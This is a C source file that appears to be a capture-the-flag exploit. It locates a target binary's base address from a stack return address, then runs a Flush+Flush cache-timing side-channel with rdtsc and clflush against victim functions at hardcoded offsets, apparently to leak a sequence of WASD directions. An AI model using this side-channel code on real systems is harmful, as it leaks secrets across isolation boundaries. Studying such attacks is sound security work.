#include <emmintrin.h>
#include <stdarg.h>
#include <stdint.h>
#include <immintrin.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <asm/unistd.h>

typedef uint64_t u64;
typedef int64_t  i64;

__attribute__((naked))
i64 syscall(i64 nr, ...) {
    asm volatile(
        "push r8\n"
        "push r9\n"
        "push r10\n"
        "push r11\n"
        "mov rax, rdi\n"
        "mov rdi, rsi\n"
        "mov rsi, rdx\n"
        "mov rdx, rcx\n"
        "mov r10, r8\n"
        "mov r8,  r9\n"
        "mov r9,  qword ptr [rsp + 40]\n"
        "syscall\n"
        "pop r11\n"
        "pop r10\n"
        "pop r9\n"
        "pop r8\n"
        "ret\n"
    );
}

void exit(int code) {
    syscall(0x3c, code);
}

void putchar (char ch) {
    volatile char sch = ch;
    syscall(1, 1, &sch, 1);
}

void print (char * s) {
    while (*s != 0) {
        putchar(*s);
        s++;
    }
}

void puts (char * s) {
    print(s);
    putchar('\n');
}

char hexchar(char ch) {
    if (ch < 10) return ch + '0';
    return ch + ('A' - 10);
}

void hex(u64 n) {
    char buf[32];
    for (int i = 0; i < 16; i++) {
        buf[i] = hexchar(n >> 60);
        n <<= 4;
    }
    buf[16] = 0;
    print("0x");
    print(buf);
}

void dec(u64 n) {
    char buf[32] = {0};
    char *ptr = buf+31;
    do {
        *--ptr = n % 10 + '0';
        n /= 10;
    } while (n != 0);
    print(ptr);
}

void delay(u64 amount) {
    u64 start = __rdtsc();
    while (__rdtsc() - start < amount);
}

#define logh(s, n)print(s); hex((u64)(n)); putchar('\n')
#define logi(s, n)print(s); dec((u64)(n)); putchar('\n')
#define flush(addr)_mm_clflush((const void *)(addr))
#define barrier()_mm_mfence()

__attribute__((naked, noinline))
u64 timing(u64 addr) {
    // asm("" ::: "memory");
    // _mm_mfence();
    // _mm_lfence();
    // u64 tic = __rdtsc();
    // _mm_lfence();
    // _mm_clflush((const void *)addr);
    // _mm_lfence();
    // u64 toc = __rdtsc();
    // _mm_lfence();
    // return toc - tic;
    asm volatile(
        "mfence\n"
        "lfence\n"
        "rdtsc\n"
        "mov rsi, rax\n"
        "mov rcx, rdx\n"
        "clflush byte ptr [rdi]\n"
        "mfence\n"
        "rdtsc\n"
        "shl rcx, 0x20\n"
        "shl rdx, 0x20\n"
        "or  rsi, rcx\n"
        "or  rax, rdx\n"
        "sub rax, rsi\n"
        "ret\n"
    );
}

void exploit(u64 *stack, int victim) {
    logh("stack: ", stack);

    u64 retaddr = *(stack + 1);
    u64 filebase = retaddr - 0x12ff;

    logh("filebase: ", filebase);

    volatile u64 *mem = (volatile u64 *)syscall(__NR_mmap, NULL, 0x400000, PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    logh("mem: ", mem);

    u64 offsets[] = { 0x17a0, 0x1660, 0x1530, 0x1400, 0x19e0, 0x18e0, };
    char directions[] = { 'S', 'W', 'D', 'A', };
    u64 offset = filebase + offsets[victim];
    logh("offset: ", offset);

    print("starting testing...\n");

    u64 clk;
    for (int i = 0; i < 32; i++) {
        clk = timing(offset);
        clk = timing(offset);
        // if (clk < 70) {
        //     print("MSG:uncached flush time:\t"); dec(clk); putchar('\n');
        // }
        print("MSG:uncached flush time:\t"); dec(clk); putchar('\n');
        ((void(*)(void))offset)();
        delay(10000000);
        clk = timing(offset);
        print("MSG:cached flush time:\t"); dec(clk); putchar('\n');
    }
}

// we put the main function into the `.entry` section
// and use custom linker script in order to guarantee
// main is run first in the flat binary
void __attribute__((section(".entry"))) main () {
    u64* stack;
    asm volatile(
        "mov %[stack], rsp\n"
        : [stack] "=r" (stack)
    );
    exploit(stack, 3);
    print("[+] exploit done\n");
    exit(7);
}